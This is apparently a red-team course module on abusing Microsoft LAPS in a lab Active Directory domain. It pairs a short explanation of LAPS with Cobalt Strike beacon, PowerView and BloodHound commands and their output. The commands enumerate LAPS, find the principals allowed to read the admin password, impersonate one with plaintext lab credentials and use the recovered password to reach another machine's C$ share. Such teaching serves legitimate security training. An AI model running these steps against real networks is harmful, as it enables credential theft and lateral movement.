Organisations often have a build process for physical and virtual machines within their environment. It's common that everything is built from the same "gold image" to ensure consistency and compliance. However, these processes can result in every machine having the same password on accounts such as the local administrator. If one machine and therefore the local administrator password hash is compromised, an attacker may be able to move laterally to every machine in the domain using the same set of credentials.

LAPS is a Microsoft solution for managing the credentials of a local administrator account on every machine, either the default RID 500 or a custom account. It ensures that the password for each account is different, random, and automatically changed on a defined schedule. Permission to request and reset the credentials can be delegated, which are also auditable. Here is a quick summary of how LAPS works:

1.  The Active Directory schema is extended and adds two new properties to computer objects, called `ms-Mcs-AdmPwd` and `ms-Mcs-AdmPwdExpirationTime`.
2.  By default, the DACL on `AdmPwd` only grants read access to Domain Admins. Each computer object is given permission to update these properties on its own object.
3.  Rights to read `AdmPwd` can be delegated to other principals (users, groups etc). This is typically done at the OU level.
4.  A new GPO template is installed, which is used to deploy the LAPS configuration to machines (different policies can be applied to different OUs).
5.  The LAPS client is also installed on every machine (commonly distributed via GPO or a third-party software management solution).
6.  When a machine performs a gpupdate, it will check the `AdmPwdExpirationTime` property on its own computer object in AD. If the time has elapsed, it will generate a new password (based on the LAPS policy) and sets it on the `AdmPwd` property.

There are a few methods to hunt for the presence of LAPS. If LAPS is applied to a machine that you have access to, **AdmPwd.dll** will be on disk.

beacon> run hostname
```
wkstn-1

beacon> ls C:\Program Files\LAPS\CSE

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 145kb    fil     09/22/2016 08:02:08   AdmPwd.dll
```


Find GPOs that have "LAPS" or some other descriptive term in the name.

```
beacon> powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

displayname    : LAPS
name           : {4A8A4E8E-929F-401A-95BD-A7D40E0976C8}
gpcfilesyspath : \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}
```

  
Search computer objects where the `ms-Mcs-AdmPwdExpirationTime` property is not null (any Domain User can read this property).

```
beacon> powershell Get-DomainObject -SearchBase "LDAP://DC=dev,DC=cyberbotic,DC=io" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname

dnshostname              
-----------              
wkstn-1.dev.cyberbotic.io
wkstn-2.dev.cyberbotic.io
```

  

If we can find the correct GPO, we can download the LAPS configuration from the `gpcfilesyspath`.

```
beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     03/16/2021 16:59:45   Scripts
 575b     fil     03/16/2021 17:11:46   comment.cmtx
 740b     fil     03/16/2021 17:11:46   Registry.pol

beacon> download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol
[*] started download of \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol (740 bytes)
[*] download of Registry.pol is complete
```

`Parse-PolFile` from the [GPRegistryPolicyParser](https://github.com/PowerShell/GPRegistryPolicyParser) package can be used to convert this file into human-readable format.

```
PS C:\Users\Administrator\Desktop> Parse-PolFile .\Registry.pol

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordComplexity
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 3    <-- Password contains uppers, lowers and numbers (4 would also include specials)

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordLength
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 14   <-- Password length is 14

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordAgeDays
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 7    <-- Password is changed every 7 days

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : AdminAccountName
ValueType   : REG_SZ
ValueLength : 14
ValueData   : lapsadmin   <-- The name of the local admin account to manage

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : AdmPwdEnabled
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 1   <-- LAPS is enabled
```

  

BloodHound can also be used to find computers that have LAPS applied to them:

```
MATCH (c:Computer {haslaps: true}) RETURN c
```

  

And also any groups that have an edge to machines via LAPS:

```
MATCH p=(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p
```

![](https://rto-assets.s3.eu-west-2.amazonaws.com/laps/bloodhound-readlapspassword.png)

The native LAPS PowerShell cmdlets can be used if they're installed on a machine we have access to.

```
beacon> powershell Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS
```

`Find-AdmPwdExtendedRights` will list the principals allowed to read the LAPS password for machines in the given OU.

```
beacon> run hostname
wkstn-2

beacon> getuid
[*] You are DEV\nlamb

beacon> powershell Find-AdmPwdExtendedRights -Identity Workstations | fl

ObjectDN             : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
ExtendedRightHolders : {NT AUTHORITY\SYSTEM, DEV\Domain Admins, DEV\1st Line Support}
```

Since Domain Admins can read all the LAPS password attributes, `Get-AdmPwdPassword` will do just that.

```
beacon> powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl

ComputerName        : WKSTN-2
DistinguishedName   : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Password            : WRSZV43u16qkc1
ExpirationTimestamp : 5/20/2021 12:57:36 PM
```

This isn't particularly useful as if you already have Domain Admin privileges, you probably don't need to leverage the LAPS passwords. However, if we have the credentials for somebody in the `1st Line Support`, this could allow us to move laterally to a machine with an even higher-privileged user logged on.

bfarmer cannot read the LAPS passwords:

```
beacon> run hostname
wkstn-1

beacon> getuid
[*] You are DEV\bfarmer

beacon> powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl

ComputerName        : WKSTN-2
DistinguishedName   : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Password            : 
ExpirationTimestamp : 5/20/2021 12:57:36 PM
```

Make a token (or use some other method of impersonation) for a user in the `1st Line Support` group.

```
beacon> make_token DEV\jking Purpl3Drag0n
beacon> powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl

ComputerName        : WKSTN-2
DistinguishedName   : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Password            : P0OPwa4R64AkbJ
ExpirationTimestamp : 3/23/2021 5:18:43 PM

beacon> rev2self
beacon> make_token .\lapsadmin P0OPwa4R64AkbJ
beacon> ls \\wkstn-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 14:35:19   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     03/16/2021 17:09:07   Program Files
          dir     03/04/2021 15:58:19   Program Files (x86)
          dir     03/16/2021 17:51:42   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/19/2021 14:45:10   System Volume Information
          dir     03/03/2021 12:17:35   Users
          dir     02/17/2021 16:16:17   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 704mb    fil     03/16/2021 17:01:51   pagefile.sys
```

If you don't have access to the native LAPS cmdlets, PowerView can find the principals that have `ReadPropery` on `ms-Mcs-AdmPwd`. There are also other tools such as the [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit).

```
beacon> powershell Get-DomainObjectAcl -SearchBase "LDAP://OU=Workstations,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -like "*ReadProperty*" } | select ObjectDN, SecurityIdentifier

ObjectDN                                              SecurityIdentifier
--------                                              ------------------
OU=Workstations,DC=dev,DC=cyberbotic,DC=io            S-1-5-21-3263068140-2042698922-2891547269-1125
CN=WKSTN-1,OU=Workstations,DC=dev,DC=cyberbotic,DC=io S-1-5-21-3263068140-2042698922-2891547269-1125
CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io S-1-5-21-3263068140-2042698922-2891547269-1125

beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125
DEV\1st Line Support

beacon> make_token DEV\jking Purpl3Drag0n
beacon> powershell Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd

ms-mcs-admpwd 
------------- 
P0OPwa4R64AkbJ
```